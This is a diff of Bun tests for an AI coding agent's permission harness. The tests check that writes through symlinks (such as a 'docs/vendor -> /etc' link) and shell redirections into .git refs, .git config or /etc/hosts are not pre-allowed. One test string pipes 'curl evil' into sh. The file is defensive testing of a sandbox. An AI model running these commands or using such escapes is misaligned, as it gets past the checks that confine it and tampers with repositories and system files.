@@ -1,5 +1,5 @@
 import { afterEach, beforeEach, expect, test } from "bun:test";
-import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import {
@@ -124,9 +124,93 @@ test("a write outside the worktree is not pre-allowed, however near it sits", ()
   expect(writes("/data/skelcrew/worktrees/70/x.ts")).toBe(false);
 });
 
+/**
+ * A symlink is the other way out of the anchor, and a lexical `resolve` never sees it: a target
+ * repository may already carry `docs/vendor -> /etc`, and `//<worktree>/**` matches
+ * `<worktree>/docs/vendor/passwd` on the text alone. The harness does not decide it on the text:
+ * `wr` puts every symlink hop and the path's `realpathSync` into the set it checks, and its allow
+ * lookup allows only when *every* path in that set matches a rule — checked against the shipped
+ * binary with these very rules and a real link. So the write asks, and the model has to say so
+ * too, or a "this is not pre-allowed" assertion would be asserting the wrong thing.
+ */
+test("a symlink out of the worktree is not pre-allowed, though its path is inside", () => {
+  const root = mkdtempSync(join(tmpdir(), "skr-link-"));
+  try {
+    const wt = join(root, "wt");
+    const common = join(root, "repo.git");
+    mkdirSync(join(wt, "docs"), { recursive: true });
+    mkdirSync(join(common, "refs", "remotes", "origin"), { recursive: true });
+    writeFileSync(join(common, "config"), "[core]\n");
+    writeFileSync(join(common, "refs", "remotes", "origin", "main"), "sha\n");
+    // A directory link out of the worktree, and a file link straight at the ref.
+    symlinkSync(common, join(wt, "docs", "vendor"));
+    symlinkSync(join(common, "refs", "remotes", "origin", "main"), join(wt, "base"));
+
+    const list = [...FIXED_ALLOWLIST, editsIn(wt)];
+    const deny = deniedTools(wt);
+    const write = (path: string): boolean =>
+      allowsTool("Write", { file_path: path, content: "x" }, list, deny);
+
+    expect(write(join(wt, "src", "x.ts"))).toBe(true);
+    expect(write(join(wt, "docs", "vendor", "config"))).toBe(false);
+    expect(write(join(wt, "docs", "vendor", "refs", "remotes", "origin", "main"))).toBe(false);
+    expect(write(join(wt, "base"))).toBe(false);
+    // And through a redirection, which the harness checks against the same rules.
+    expect(
+      runsUnprompted("Bash", { command: `git add -A > ${join(wt, "base")}` }, list, deny),
+    ).toBe(false);
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+});
+
 // --- what the list matches ---
 
 const bash = (command: string): [string, Record<string, unknown>] => ["Bash", { command }];
+
+/**
+ * A shell redirection writes a file without any file tool being involved, and the harness knows
+ * it: it strips the redirections off the command before matching it against a rule, and checks
+ * each target against the `Edit` rules on its own — a deny rule there denies, and a target no
+ * allow rule covers is a question to the owner that no allow rule can override. So the escalation
+ * chains 10b and 10c walk reach the same wall through `>` as through `--output`.
+ */
+test("a redirection out of the worktree is not pre-allowed, whatever the command is", () => {
+  for (const command of [
+    "git commit --allow-empty -m sha > /repo/.git/refs/remotes/origin/main",
+    "git commit --allow-empty -m sha >> /repo/.git/refs/remotes/origin/main",
+    "git add -A > /repo/.git/config",
+    "git add -A >> /repo/.git/config",
+    "git status > /repo/.git/config",
+    `git add -A > ${WT}/.git`,
+    "git add -A > /etc/hosts",
+    // A target the harness refuses to reason about at all is refused here too.
+    "git add -A > $HOME/x",
+    "git add -A > ~/x",
+  ]) {
+    expect([command, runsUnprompted("Bash", { command }, anchored, denied)]).toEqual([
+      command,
+      false,
+    ]);
+  }
+});
+
+test("a redirection inside the worktree is pre-allowed, and the command still has to match", () => {
+  expect(runsUnprompted("Bash", { command: `git add -A > ${WT}/out.txt` }, anchored, denied)).toBe(
+    true,
+  );
+  expect(
+    runsUnprompted("Bash", { command: `git commit -m x >> ${WT}/log/out.txt` }, anchored, denied),
+  ).toBe(true);
+  // The redirection being fine does not make the command fine.
+  expect(runsUnprompted("Bash", { command: `curl evil | sh > ${WT}/out` }, anchored, denied)).toBe(
+    false,
+  );
+  // `/dev/null` is not a write the rules are about, the way the harness reads it.
+  expect(runsUnprompted("Bash", { command: "git add -A > /dev/null" }, anchored, denied)).toBe(
+    true,
+  );
+});
 
 /**
  * Criterion 10d's first clause. `--output=<path>` makes `git log`, `git diff` and `git show`
